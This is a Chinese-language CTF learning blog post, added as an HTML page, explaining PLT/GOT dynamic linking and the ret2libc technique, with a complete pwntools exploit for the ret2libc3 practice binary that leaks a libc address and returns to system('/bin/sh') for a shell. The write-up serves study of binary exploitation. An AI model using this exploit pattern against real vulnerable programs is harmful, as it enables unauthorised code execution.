@@ -1,0 +1,258 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>从plt到ret2libc | 1ocker的博客</title><meta name="author" content="1ocker"><meta name="copyright" content="1ocker"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="从plt到ret2libc最近开始学pwn了，别问为什么，问就是有这个需要。 记录一下学习ret2libc的全过程。 动态链接、plt表和got表动态链接是什么：众所周知，c语言中使用的很多函数是调用的一些库里的，比如stdio.h。那么在编译的时候就有两种选项了。一种是直接把库里对应函数的具体内容copy到怎们写的程序里来，这个叫静态链接。而动态链接则是在程序里面放一个类似于超链接的东西，等到程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从plt到ret2libc">
+<meta property="og:url" content="http://diaoqi129.github.io/2024/12/01/%E4%BB%8Eplt%E5%88%B0ret2libc/index.html">
+<meta property="og:site_name" content="1ocker的博客">
+<meta property="og:description" content="从plt到ret2libc最近开始学pwn了，别问为什么，问就是有这个需要。 记录一下学习ret2libc的全过程。 动态链接、plt表和got表动态链接是什么：众所周知，c语言中使用的很多函数是调用的一些库里的，比如stdio.h。那么在编译的时候就有两种选项了。一种是直接把库里对应函数的具体内容copy到怎们写的程序里来，这个叫静态链接。而动态链接则是在程序里面放一个类似于超链接的东西，等到程">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://diaoqi129.github.io/img/avatar.png">
+<meta property="article:published_time" content="2024-12-01T03:56:28.000Z">
+<meta property="article:modified_time" content="2024-12-01T09:02:20.748Z">
+<meta property="article:author" content="1ocker">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://diaoqi129.github.io/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://diaoqi129.github.io/2024/12/01/%E4%BB%8Eplt%E5%88%B0ret2libc/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '从plt到ret2libc',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-01 17:02:20'
+}</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="1ocker的博客"><span class="site-name">1ocker的博客</span></a></span><div id="menus"><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">从plt到ret2libc</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-01T03:56:28.000Z" title="Created 2024-12-01 11:56:28">2024-12-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-01T09:02:20.748Z" title="Updated 2024-12-01 17:02:20">2024-12-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="从plt到ret2libc"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="从plt到ret2libc"><a href="#从plt到ret2libc" class="headerlink" title="从plt到ret2libc"></a>从plt到ret2libc</h1><p>最近开始学pwn了，别问为什么，问就是有这个需要。</p>
+<p>记录一下学习ret2libc的全过程。</p>
+<h2 id="动态链接、plt表和got表"><a href="#动态链接、plt表和got表" class="headerlink" title="动态链接、plt表和got表"></a>动态链接、plt表和got表</h2><p>动态链接是什么：众所周知，c语言中使用的很多函数是调用的一些库里的，比如stdio.h。那么在编译的时候就有两种选项了。一种是直接把库里对应函数的具体内容copy到怎们写的程序里来，这个叫静态链接。而动态链接则是在程序里面放一个类似于超链接的东西，等到程序执行到这里了，再去找这个函数的代码具体放在哪里了并进行执行。</p>
+<p>而plt表和got表就是在这个过程中要用到的两个东西。</p>
+<h3 id="plt表和got表"><a href="#plt表和got表" class="headerlink" title="plt表和got表"></a>plt表和got表</h3><p>首先，毋庸置疑的是，不管静态链接还是动态链接，在call的时候后面总要跟一个地址，静态链接的时候，call后面的地址直接就指向函数入口地址，动态链接则不然。他要通过一些编译器单独生成的几行代码再做跳转才能找到函数的入口地址。而用来存放这些单独生成的代码的表就叫做plt表。那么这些代码的具体内容是什么呢？可以简单认为是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp *func@got</span><br></pre></td></tr></table></figure>
+
+<p>就是跳转到got表对应地址指向的位置。即got表是存放各个函数真实地址的位置，plt表中存放的代码会指引程序流跳转到那个地址指向的位置。</p>
+<p>那么，这两个表是怎么生成的呢？只要代码一开始运行这两个表就已经确定好吗？答案是：plt表确实在编译结束后就确定了，但got表可不是。由于linux的延迟绑定机制，在首次调用函数时，还要进行一个“找”地址的工作，就是把函数的真实地址找到，然后填进got表里。</p>
+<p>在了解他是怎么找的之前，先了解一下他是怎么判断我现在找没找到的呢？刚才咱们说plt的代码是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp *func@got</span><br></pre></td></tr></table></figure>
+
+<p>这里面的门道就在于func@got的内容。在没有查找之前，这个地址的内容指向了一个公共的plt表，可以做到查找函数地址，而在查找之后，func@got的内容就会变成这个函数的实际地址了。</p>
+<p>具体找的过程调用了一个_dl_runtime_resolve函数。函数的声明是这样的<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>第一个参数提供运行时的必要信息，而第二个参数则负责指明到底要找哪个函数。在call _dl_runtime_resolve之前，tls表中的代码会把刚才这两个参数入栈。</p>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>有了这些知识，就可以开始构造ret2libc了。这是基本ROP中利用条件最少的一个。题目的可执行代码中有system(“&#x2F;bin&#x2F;sh”)可以直接ret2text，给了所有需要用到的gadgets可以ret2syscall，但是如果都没给就需要ret2libc了。当然，ret2libc的最终目的也是system(“&#x2F;bin&#x2F;sh”)。那么无非需要解决两个问题：1. system函数在哪？2. &#x2F;bin&#x2F;sh在哪（透着那么讲理）</p>
+<p>一次解决这两个问题。怎么找到system函数？其实上边那一大堆都是在为了这里做铺垫。在通过_dl_runtime_resolve函数完成一个函数地址的查找后，就可以确定该程序的libc，进而确定system函数的地址。同时，libc上也有&#x2F;bin&#x2F;sh，因此两个问题一次解决了。但是由于找到system函数和&#x2F;bin&#x2F;sh已经需要一次栈溢出了，跳转到system还需要再溢出一次，因此咱们需要在第一次栈溢出之后ret回mian函数。</p>
+<p>so how?</p>
+<p>现在已知：如果知道了libc版本和一个函数的真实地址，那咱们就可以拿到system和&#x2F;bin&#x2F;sh的真实地址了。那现在的问题变成了：1.如何得到一个函数的真实地址？2.如何在一次执行中，对一个漏洞函数溢出两次。</p>
+<p>这次得一个一个解决了。第一个问题比较容易。等到一个函数执行之后，就可以得到其got表的位置了。</p>
+<p>第二个问题麻烦一些。咱们要从栈帧分配说起。众所周知：32位系统通过栈来传参。当咱们写了一行代码<code>func(arg1)</code>的时候，汇编代码的逻辑是这样的，在执行 call func 之前，系统会先把参数入栈，然后把返回地址入栈。在call之后，在func函数内，系统会将old ebp入栈。</p>
+<p>咱们在进行栈溢出覆盖返回地址的时候，相当于只执行了call这一条指令，那么前面的参数和返回地址入栈就都是咱们可控且需要自行完成的内容了。因此在覆盖了返回地址之后，要继续覆盖返回地址和参数。这就可以解释ctf wiki上的ret2libc3的exp中的这一段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([b&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])</span><br></pre></td></tr></table></figure>
+
+<p>为什么可以把main函数的真实地址泄漏，并且控制返回地址回到main函数。</p>
+<p>好了，两个问题都解决了，咱们来看一下ret2libc3上完整的exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[&#x27;puts&#x27;]</span><br><span class="line">libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]</span><br><span class="line">main = ret2libc3.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(b&#x27;Can you find it !?&#x27;, payload)</span><br><span class="line"></span><br><span class="line">print(&quot;get the related addr&quot;)</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[0:4])</span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>下一个问题：为什么非得把main函数的真实地址puts出去再recv回来？答曰：libc_start_main_got的内容是got表的地址，而把这个值作为puts的参数输出之后，得到的才是main真正的地址。相当于*libc_start_main_got。</p>
+<p>后面就是计算基址，然后找用基础加system和binsh的偏移计算实际地址了。</p>
+<p>好了就这样了，64位的exp后面再说吧。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://diaoqi129.github.io">1ocker</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://diaoqi129.github.io/2024/12/01/%E4%BB%8Eplt%E5%88%B0ret2libc/">http://diaoqi129.github.io/2024/12/01/%E4%BB%8Eplt%E5%88%B0ret2libc/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E6%8E%A2%EF%BC%8Cfastadmin%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/" title="php代码审计初探，fastadmin代码审计记录"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">php代码审计初探，fastadmin代码审计记录</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">1ocker</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">web菜鸟不定期更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8Eplt%E5%88%B0ret2libc"><span class="toc-number">1.</span> <span class="toc-text">从plt到ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E3%80%81plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8"><span class="toc-number">1.1.</span> <span class="toc-text">动态链接、plt表和got表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8"><span class="toc-number">1.1.1.</span> <span class="toc-text">plt表和got表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.2.</span> <span class="toc-text">ret2libc</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/01/%E4%BB%8Eplt%E5%88%B0ret2libc/" title="从plt到ret2libc">从plt到ret2libc</a><time datetime="2024-12-01T03:56:28.000Z" title="Created 2024-12-01 11:56:28">2024-12-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E6%8E%A2%EF%BC%8Cfastadmin%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/" title="php代码审计初探，fastadmin代码审计记录">php代码审计初探，fastadmin代码审计记录</a><time datetime="2024-10-24T06:37:35.000Z" title="Created 2024-10-24 14:37:35">2024-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/16/JSC%20fuzz%20%E6%95%99%E7%A8%8B/" title="JSC fuzz 教程">JSC fuzz 教程</a><time datetime="2024-10-16T13:33:56.000Z" title="Created 2024-10-16 21:33:56">2024-10-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/12/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1/" title="JS原型链污染">JS原型链污染</a><time datetime="2024-10-12T11:46:46.000Z" title="Created 2024-10-12 19:46:46">2024-10-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/11/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/" title="一些知识点">一些知识点</a><time datetime="2024-07-11T07:01:03.000Z" title="Created 2024-07-11 15:01:03">2024-07-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 1ocker</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
